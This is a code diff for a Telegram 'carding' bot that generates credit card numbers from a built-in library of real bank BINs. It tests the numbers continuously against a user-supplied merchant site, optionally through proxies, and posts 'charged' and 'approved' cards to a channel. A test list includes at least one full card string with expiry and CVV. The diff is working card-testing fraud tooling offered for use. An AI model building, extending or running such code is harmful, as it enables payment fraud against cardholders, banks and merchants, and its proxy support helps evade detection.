@@ -2,6 +2,7 @@ import os
 import asyncio
 import logging
 import random
+import time
 import aiohttp
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
@@ -23,6 +24,28 @@ logger = logging.getLogger(__name__)
 BOT_TOKEN = os.environ["BOT_TOKEN"]
 CHANNEL_ID = int(os.environ["CHANNEL_ID"])
 ADMIN_ID = int(os.environ.get("ADMIN_ID", "5451167865"))
+
+# ─── Active sessions (user_id → session state) ─────────────
+active_sessions = {}
+
+# ─── BIN Library ───────────────────────────────────────────
+BIN_LIBRARY = [
+    {"bin": "527515", "bank": "CITIBANK", "country": "US", "brand": "MASTERCARD"},
+    {"bin": "414720", "bank": "CHASE", "country": "US", "brand": "VISA"},
+    {"bin": "453201", "bank": "CAPITAL ONE", "country": "US", "brand": "VISA"},
+    {"bin": "540542", "bank": "MBNA", "country": "US", "brand": "MASTERCARD"},
+    {"bin": "489629", "bank": "WELLS FARGO", "country": "US", "brand": "VISA"},
+    {"bin": "437748", "bank": "BARCLAYS", "country": "GB", "brand": "VISA"},
+    {"bin": "512345", "bank": "RBC ROYAL BANK", "country": "CA", "brand": "MASTERCARD"},
+    {"bin": "459504", "bank": "TD BANK", "country": "CA", "brand": "VISA"},
+    {"bin": "431940", "bank": "HSBC", "country": "GB", "brand": "VISA"},
+    {"bin": "542418", "bank": "SANTANDER", "country": "ES", "brand": "MASTERCARD"},
+    {"bin": "450875", "bank": "BANK OF AMERICA", "country": "US", "brand": "VISA"},
+    {"bin": "530127", "bank": "ING BANK", "country": "NL", "brand": "MASTERCARD"},
+    {"bin": "474386", "bank": "DEUTSCHE BANK", "country": "DE", "brand": "VISA"},
+    {"bin": "517805", "bank": "COMMERZBANK", "country": "DE", "brand": "MASTERCARD"},
+    {"bin": "455221", "bank": "BNP PARIBAS", "country": "FR", "brand": "VISA"},
+]
 
 TEST_CARDS = [
     "5275150060415544|05|27|803",
@@ -249,7 +272,8 @@ def main_menu_keyboard():
         [InlineKeyboardButton("🏦 𝐁𝐈𝐍 𝐋𝐨𝐨𝐤𝐮𝐩", callback_data="btn_bin"),
          InlineKeyboardButton("🎲 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞", callback_data="btn_gen")],
         [InlineKeyboardButton("⚡ 𝐀𝐮𝐭𝐨 𝐂𝐡𝐞𝐜𝐤", callback_data="btn_autochk"),
-         InlineKeyboardButton("❓ 𝐇𝐞𝐥𝐩", callback_data="btn_help")],
+         InlineKeyboardButton("🛑 𝐒𝐭𝐨𝐩", callback_data="btn_stop")],
+        [InlineKeyboardButton("❓ 𝐇𝐞𝐥𝐩", callback_data="btn_help")],
     ])
 
 
@@ -384,16 +408,83 @@ async def button_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     if data == "btn_autochk":
+        # Show BIN library + custom BIN option
+        buttons = []
+        for i, b in enumerate(BIN_LIBRARY):
+            buttons.append(InlineKeyboardButton(
+                f"{b['brand']} | {b['bin']} | {b['bank']} ({b['country']})",
+                callback_data=f"abin_{i}",
+            ))
+        kb = [[btn] for btn in buttons]
+        kb.append([InlineKeyboardButton("✏️ 𝐂𝐮𝐬𝐭𝐨𝐦 𝐁𝐈𝐍", callback_data="abin_custom")])
+        kb.append([InlineKeyboardButton("🔙 𝐁𝐚𝐜𝐤 𝐭𝐨 𝐌𝐞𝐧𝐮", callback_data="btn_back")])
         await query.edit_message_text(
             "⚡ <b>𝐀𝐮𝐭𝐨 𝐂𝐡𝐞𝐜𝐤</b>\n\n"
-            "Generate cards from BIN and auto-check against a site.\n\n"
-            "Send: <code>bin site_url [count]</code>\n"
-            "Example: <code>527515 https://example.com 10</code>\n\n"
-            "Or use: /autochk <code>bin site [count]</code>",
+            "Select a BIN from the library or enter custom:\n"
+            "Generates cards and checks continuously until stopped.",
+            parse_mode="HTML",
+            reply_markup=InlineKeyboardMarkup(kb),
+        )
+        return
+
+    if data.startswith("abin_"):
+        idx = data.replace("abin_", "")
+        if idx == "custom":
+            await query.edit_message_text(
+                "⚡ <b>𝐀𝐮𝐭𝐨 𝐂𝐡𝐞𝐜𝐤</b>\n\n"
+                "Send your custom BIN (6-16 digits):\n"
+                "Example: <code>527515</code> or <code>527515xxxxxxxxxx</code>",
+                parse_mode="HTML",
+                reply_markup=back_button(),
+            )
+            context.user_data['awaiting'] = 'autochk_bin'
+        else:
+            bin_entry = BIN_LIBRARY[int(idx)]
+            context.user_data['autochk_bin'] = bin_entry['bin']
+            await query.edit_message_text(
+                f"⚡ <b>𝐀𝐮𝐭𝐨 𝐂𝐡𝐞𝐜𝐤</b>\n\n"
+                f"BIN: <code>{bin_entry['bin']}</code> ({bin_entry['brand']} | {bin_entry['bank']})\n\n"
+                "Now send the site URL to check against:",
+                parse_mode="HTML",
+                reply_markup=back_button(),
+            )
+            context.user_data['awaiting'] = 'autochk_site'
+        return
+
+    if data == "aproxy_yes":
+        await query.edit_message_text(
+            "⚡ <b>𝐀𝐮𝐭𝐨 𝐂𝐡𝐞𝐜𝐤</b>\n\n"
+            "Send proxy in format:\n"
+            "<code>host:port</code> or <code>user:pass@host:port</code>\n\n"
+            "Supports HTTP/SOCKS5.",
             parse_mode="HTML",
             reply_markup=back_button(),
         )
-        context.user_data['awaiting'] = 'autochk'
+        context.user_data['awaiting'] = 'autochk_proxy'
+        return
+
+    if data == "aproxy_no":
+        context.user_data['autochk_proxy'] = None
+        user_id = update.effective_user.id
+        await query.edit_message_text("⚡ Starting Auto Check... ⏳", parse_mode="HTML")
+        asyncio.create_task(
+            run_continuous_autochk(update, context, user_id, query.message)
+        )
+        return
+
+    if data == "btn_stop":
+        user_id = update.effective_user.id
+        if user_id in active_sessions:
+            active_sessions[user_id]['running'] = False
+            await query.edit_message_text(
+                "🛑 <b>Stopping session...</b> Please wait.",
+                parse_mode="HTML",
+            )
+        else:
+            await query.edit_message_text(
+                "No active session to stop.",
+                reply_markup=main_menu_keyboard(),
+            )
         return
 
     if data == "btn_help":
@@ -406,8 +497,14 @@ async def button_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "📡 <b>Mass Site</b> — /msite (reply to site file)\n"
             "🏦 <b>BIN Lookup</b> — /bin <code>123456</code>\n"
             "🎲 <b>Generate</b> — /gen <code>bin [count]</code>\n"
-            "⚡ <b>Auto Check</b> — /autochk <code>bin site [count]</code>\n\n"
-            "You can use buttons or commands!\n\n"
+            "⚡ <b>Auto Check</b> — Continuous BIN checker (button or /autochk)\n"
+            "🛑 <b>Stop</b> — /stop to halt running Auto Check\n\n"
+            "<b>Auto Check Features:</b>\n"
+            "• BIN Library (15+ built-in BINs) or Custom BIN\n"
+            "• Proxy support (optional)\n"
+            "• Runs continuously until you press Stop\n"
+            "• Live status updates every 5 seconds\n"
+            "• Charged/Approved CCs posted to channel\n\n"
             "<b>𝐅𝐨𝐫𝐦𝐚𝐭𝐬:</b>\n"
             "Card: <code>cc_number|mm|yy|cvv</code>\n"
             "Site: <code>https://example.com</code>\n"
@@ -542,22 +639,52 @@ async def autochk_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_admin(update):
         await deny(update)
         return
-    if len(context.args) < 2:
+    if not context.args:
         await update.message.reply_text(
-            "Usage: /autochk <code>bin site [count]</code>\n"
-            "Example: /autochk 527515 https://example.com 10",
+            "Usage: /autochk <code>bin site</code>\n"
+            "Example: /autochk 527515 https://example.com\n\n"
+            "Or use the ⚡ Auto Check button for guided flow with BIN library.",
             parse_mode="HTML",
         )
         return
     bin_str = context.args[0]
+    if len(context.args) < 2:
+        # Only BIN provided, ask for site
+        context.user_data['autochk_bin'] = bin_str
+        await update.message.reply_text(
+            f"⚡ BIN set: <code>{bin_str}</code>\n\nNow send the site URL:",
+            parse_mode="HTML",
+            reply_markup=back_button(),
+        )
+        context.user_data['awaiting'] = 'autochk_site'
+        return
     site = context.args[1]
-    count = 10
-    if len(context.args) > 2:
-        try:
-            count = min(int(context.args[2]), 50)
-        except ValueError:
-            pass
-    await handle_autochk(update, context, bin_str, site, count)
+    context.user_data['autochk_bin'] = bin_str
+    context.user_data['autochk_site'] = site
+    context.user_data['autochk_proxy'] = None
+    user_id = update.effective_user.id
+    msg = await update.message.reply_text("⚡ Starting Auto Check... ⏳", parse_mode="HTML")
+    asyncio.create_task(
+        run_continuous_autochk(update, context, user_id, msg)
+    )
+
+
+async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_admin(update):
+        await deny(update)
+        return
+    user_id = update.effective_user.id
+    if user_id in active_sessions:
+        active_sessions[user_id]['running'] = False
+        await update.message.reply_text(
+            "🛑 <b>Stopping session...</b> Please wait.",
+            parse_mode="HTML",
+        )
+    else:
+        await update.message.reply_text(
+            "No active session to stop.",
+            reply_markup=main_menu_keyboard(),
+        )
 
 
 async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -572,8 +699,15 @@ async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "📡 /msite — Mass site check (reply to file)\n"
         "🏦 /bin <code>123456</code> — BIN lookup\n"
         "🎲 /gen <code>bin [count]</code> — Generate cards from BIN\n"
-        "⚡ /autochk <code>bin site [count]</code> — Generate + auto check\n"
+        "⚡ /autochk <code>bin site</code> — Continuous auto check\n"
+        "🛑 /stop — Stop running auto check\n"
         "/start — Show button menu\n\n"
+        "<b>Auto Check Features:</b>\n"
+        "• BIN Library (15+ BINs) or Custom\n"
+        "• Optional Proxy support\n"
+        "• Runs infinitely until /stop\n"
+        "• Live status every 5 sec\n"
+        "• Hits posted to channel\n\n"
         "𝐃𝐞𝐯 ➜ @Xoarch"
     )
     await update.message.reply_text(text, parse_mode="HTML", reply_markup=main_menu_keyboard())
@@ -660,19 +794,60 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parts_raw = text.split()
         if len(parts_raw) < 2:
             await update.message.reply_text(
-                "Send: <code>bin site_url [count]</code>",
+                "Send: <code>bin site_url</code>",
                 parse_mode="HTML", reply_markup=main_menu_keyboard(),
             )
             return
         bin_str = parts_raw[0]
         site = parts_raw[1]
-        count = 10
-        if len(parts_raw) > 2:
-            try:
-                count = min(int(parts_raw[2]), 50)
-            except ValueError:
-                pass
-        await handle_autochk(update, context, bin_str, site, count)
+        context.user_data['autochk_bin'] = bin_str
+        context.user_data['autochk_site'] = site
+        context.user_data['autochk_proxy'] = None
+        user_id = update.effective_user.id
+        msg = await update.message.reply_text("⚡ Starting Auto Check... ⏳", parse_mode="HTML")
+        asyncio.create_task(
+            run_continuous_autochk(update, context, user_id, msg)
+        )
+
+    elif awaiting == 'autochk_bin':
+        context.user_data['awaiting'] = None
+        bin_str = text.strip().split()[0]
+        if len(bin_str) < 6:
+            await update.message.reply_text(
+                "BIN must be at least 6 digits.",
+                reply_markup=main_menu_keyboard(),
+            )
+            return
+        context.user_data['autochk_bin'] = bin_str
+        await update.message.reply_text(
+            f"⚡ BIN set: <code>{bin_str}</code>\n\nNow send the site URL:",
+            parse_mode="HTML",
+            reply_markup=back_button(),
+        )
+        context.user_data['awaiting'] = 'autochk_site'
+
+    elif awaiting == 'autochk_site':
+        context.user_data['awaiting'] = None
+        site = text.strip().split()[0]
+        context.user_data['autochk_site'] = site
+        await update.message.reply_text(
+            f"⚡ Site set: <code>{site}</code>\n\nUse proxy?",
+            parse_mode="HTML",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("🌐 𝐀𝐝𝐝 𝐏𝐫𝐨𝐱𝐲", callback_data="aproxy_yes"),
+                 InlineKeyboardButton("⏭️ 𝐒𝐤𝐢𝐩", callback_data="aproxy_no")],
+                [InlineKeyboardButton("🔙 𝐁𝐚𝐜𝐤 𝐭𝐨 𝐌𝐞𝐧𝐮", callback_data="btn_back")],
+            ]),
+        )
+
+    elif awaiting == 'autochk_proxy':
+        context.user_data['awaiting'] = None
+        context.user_data['autochk_proxy'] = text.strip()
+        user_id = update.effective_user.id
+        msg = await update.message.reply_text("⚡ Starting Auto Check with proxy... ⏳", parse_mode="HTML")
+        asyncio.create_task(
+            run_continuous_autochk(update, context, user_id, msg)
+        )
 
     else:
         if '|' in text and ' ' in text:
@@ -950,77 +1125,154 @@ async def handle_gen(update: Update, context: ContextTypes.DEFAULT_TYPE, bin_str
     await update.message.reply_text(result, parse_mode="HTML", reply_markup=main_menu_keyboard())
 
 
-async def handle_autochk(update: Update, context: ContextTypes.DEFAULT_TYPE, bin_str: str, site: str, count: int = 10):
+async def run_continuous_autochk(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int, status_msg):
+    bin_str = context.user_data.get('autochk_bin', '')
+    site = context.user_data.get('autochk_site', '')
+    proxy_str = context.user_data.get('autochk_proxy', None)
+
     if not site.startswith('http'):
         site = 'https://' + site
 
-    cards = generate_cards_from_bin(bin_str, count)
-    if not cards:
-        await update.message.reply_text(
-            "Invalid BIN. Send at least 6 digits.",
-            reply_markup=main_menu_keyboard(),
-        )
+    bin6 = ''.join(c for c in bin_str if c.isdigit())[:6]
+    if len(bin6) < 6:
+        try:
+            await status_msg.edit_text(
+                "Invalid BIN. Send at least 6 digits.",
+                reply_markup=main_menu_keyboard(),
+            )
+        except Exception:
+            pass
         return
 
-    bin6 = ''.join(c for c in bin_str if c.isdigit())[:6]
     info = await get_bin_info(bin6)
     info_str = fmt_info(info['brand'], info['type'], info['level'])
 
-    msg = await update.message.reply_text(
-        f"⚡ <b>Auto Check</b>\n"
-        f"BIN: <code>{bin_str}</code> | Site: <code>{site}</code>\n"
-        f"Generated {len(cards)} cards, checking... ⏳",
-        parse_mode="HTML",
-    )
+    session = {
+        'running': True,
+        'stats': {'charged': 0, 'approved': 0, 'tds': 0, 'declined': 0, 'error': 0},
+        'total': 0,
+        'start_time': time.time(),
+    }
+    active_sessions[user_id] = session
 
-    stats = {'charged': 0, 'approved': 0, 'tds': 0, 'declined': 0, 'error': 0}
+    proxy_label = f"Proxy: {proxy_str}" if proxy_str else "No Proxy"
+    last_status_update = time.time()
 
-    for i, cc_string in enumerate(cards):
-        try:
-            parts = parse_cc_string(cc_string)
-        except Exception:
-            stats['error'] += 1
-            continue
+    try:
+        await status_msg.edit_text(
+            f"⚡ <b>𝐀𝐔𝐓𝐎 𝐂𝐇𝐄𝐂𝐊 𝐑𝐔𝐍𝐍𝐈𝐍𝐆</b>\n"
+            f"━━━━━━━━━━━━━━\n"
+            f"𝐁𝐈𝐍: <code>{bin_str}</code>\n"
+            f"𝙄𝙣𝙛𝙤: {info_str}\n"
+            f"𝐒𝐢𝐭𝐞: <code>{site}</code>\n"
+            f"🌐 {proxy_label}\n"
+            f"━━━━━━━━━━━━━━\n"
+            f"Scanning... Use 🛑 Stop or /stop to halt.\n"
+            f"Live updates every 5 seconds.",
+            parse_mode="HTML",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("🛑 𝐒𝐓𝐎𝐏", callback_data="btn_stop")]
+            ]),
+        )
+    except Exception:
+        pass
 
-        success, message, gateway, price, currency, category = await run_with_retry(parts, site)
-        stats[category] += 1
+    while session['running']:
+        cards = generate_cards_from_bin(bin_str, 10)
+        if not cards:
+            break
 
-        if category in ('charged', 'approved', 'tds'):
-            appr_clean = approved_message(message) if category == 'approved' else None
-            clean = appr_clean if appr_clean else extract_clean_response(message)
-            if category == 'charged':
-                clean = 'ORDER_PLACED'
-            elif category == 'tds':
-                clean = 'OTP_REQUIRED'
+        for cc_string in cards:
+            if not session['running']:
+                break
 
-            price_fmt = fmt_price(price, currency)
-            result_text = build_result_text(
-                cc_string, category, clean, price_fmt, info_str,
-                info['bank'], info['country'], info['flag']
-            )
             try:
-                await context.bot.send_message(chat_id=CHANNEL_ID, text=result_text, parse_mode="HTML")
-            except Exception as e:
-                logger.error(f"Channel post error: {e}")
-            await update.message.reply_text(result_text, parse_mode="HTML")
-
-        if (i + 1) % 5 == 0:
-            try:
-                await msg.edit_text(
-                    f"⚡ <b>Auto Check</b> | BIN: <code>{bin_str}</code>\n"
-                    f"Progress: {i + 1}/{len(cards)} ⏳",
-                    parse_mode="HTML",
-                )
+                parts = parse_cc_string(cc_string)
             except Exception:
-                pass
+                session['stats']['error'] += 1
+                session['total'] += 1
+                continue
 
+            success, message, gateway, price, currency, category = await run_with_retry(
+                parts, site, proxy_str
+            )
+            session['stats'][category] += 1
+            session['total'] += 1
+
+            if category in ('charged', 'approved', 'tds'):
+                appr_clean = approved_message(message) if category == 'approved' else None
+                clean = appr_clean if appr_clean else extract_clean_response(message)
+                if category == 'charged':
+                    clean = 'ORDER_PLACED'
+                elif category == 'tds':
+                    clean = 'OTP_REQUIRED'
+
+                price_fmt = fmt_price(price, currency)
+                result_text = build_result_text(
+                    cc_string, category, clean, price_fmt, info_str,
+                    info['bank'], info['country'], info['flag']
+                )
+                try:
+                    await context.bot.send_message(
+                        chat_id=CHANNEL_ID, text=result_text, parse_mode="HTML"
+                    )
+                except Exception as e:
+                    logger.error(f"Channel post error: {e}")
+                try:
+                    chat_id = update.effective_chat.id
+                    await context.bot.send_message(
+                        chat_id=chat_id, text=result_text, parse_mode="HTML"
+                    )
+                except Exception:
+                    pass
+
+            now = time.time()
+            if now - last_status_update >= 5:
+                last_status_update = now
+                elapsed = int(now - session['start_time'])
+                mins, secs = divmod(elapsed, 60)
+                stats = session['stats']
+                try:
+                    await status_msg.edit_text(
+                        f"⚡ <b>𝐀𝐔𝐓𝐎 𝐂𝐇𝐄𝐂𝐊 𝐑𝐔𝐍𝐍𝐈𝐍𝐆</b>\n"
+                        f"━━━━━━━━━━━━━━\n"
+                        f"𝐁𝐈𝐍: <code>{bin_str}</code> | {info_str}\n"
+                        f"𝐒𝐢𝐭𝐞: <code>{site}</code>\n"
+                        f"🌐 {proxy_label}\n"
+                        f"━━━━━━━━━━━━━━\n"
+                        f"𝐒𝐜𝐚𝐧𝐧𝐞𝐝: {session['total']} | ⏱ {mins}m {secs}s\n\n"
+                        f"🔥 Charged: {stats['charged']}\n"
+                        f"✅ Approved: {stats['approved']}\n"
+                        f"❎ 3DS: {stats['tds']}\n"
+                        f"❌ Declined: {stats['declined']}\n"
+                        f"⚠️ Errors: {stats['error']}\n"
+                        f"━━━━━━━━━━━━━━\n"
+                        f"Press 🛑 STOP or /stop to halt",
+                        parse_mode="HTML",
+                        reply_markup=InlineKeyboardMarkup([
+                            [InlineKeyboardButton("🛑 𝐒𝐓𝐎𝐏", callback_data="btn_stop")]
+                        ]),
+                    )
+                except Exception:
+                    pass
+
+    # Session ended
+    if user_id in active_sessions:
+        del active_sessions[user_id]
+
+    elapsed = int(time.time() - session['start_time'])
+    mins, secs = divmod(elapsed, 60)
+    stats = session['stats']
     summary = (
-        f"<b>⚡ 𝐀𝐔𝐓𝐎 𝐂𝐇𝐄𝐂𝐊 𝐑𝐄𝐒𝐔𝐋𝐓𝐒</b>\n"
+        f"<b>⚡ 𝐀𝐔𝐓𝐎 𝐂𝐇𝐄𝐂𝐊 𝐒𝐓𝐎𝐏𝐏𝐄𝐃</b>\n"
         f"━━━━━━━━━━━━━━\n"
         f"𝐁𝐈𝐍: <code>{bin_str}</code>\n"
         f"𝙄𝙣𝙛𝙤: {info_str}\n"
         f"𝘽𝙖𝙣𝙠: {info['bank']}\n"
-        f"𝐓𝐨𝐭𝐚𝐥: {len(cards)}\n\n"
+        f"𝐒𝐢𝐭𝐞: <code>{site}</code>\n"
+        f"⏱ Duration: {mins}m {secs}s\n"
+        f"━━━━━━━━━━━━━━\n"
+        f"𝐓𝐨𝐭𝐚𝐥 𝐒𝐜𝐚𝐧𝐧𝐞𝐝: {session['total']}\n\n"
         f"𝐂𝐡𝐚𝐫𝐠𝐞𝐝: {stats['charged']} 🔥\n"
         f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝: {stats['approved']} ✅\n"
         f"𝟑𝐃𝐒: {stats['tds']} ❎\n"
@@ -1029,7 +1281,10 @@ async def handle_autochk(update: Update, context: ContextTypes.DEFAULT_TYPE, bin
         f"━━━━━━━━━━━━━━\n"
         f"𝐃𝐞𝐯 ➜ @Xoarch"
     )
-    await msg.edit_text(summary, parse_mode="HTML", reply_markup=main_menu_keyboard())
+    try:
+        await status_msg.edit_text(summary, parse_mode="HTML", reply_markup=main_menu_keyboard())
+    except Exception:
+        pass
 
     try:
         await context.bot.send_message(chat_id=CHANNEL_ID, text=summary, parse_mode="HTML")
@@ -1075,6 +1330,7 @@ def build_app():
     app.add_handler(CommandHandler("bin", bin_cmd))
     app.add_handler(CommandHandler("gen", gen_cmd))
     app.add_handler(CommandHandler("autochk", autochk_cmd))
+    app.add_handler(CommandHandler("stop", stop_cmd))
     app.add_handler(CallbackQueryHandler(button_router))
     app.add_handler(MessageHandler(filters.Document.ALL, file_handler))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
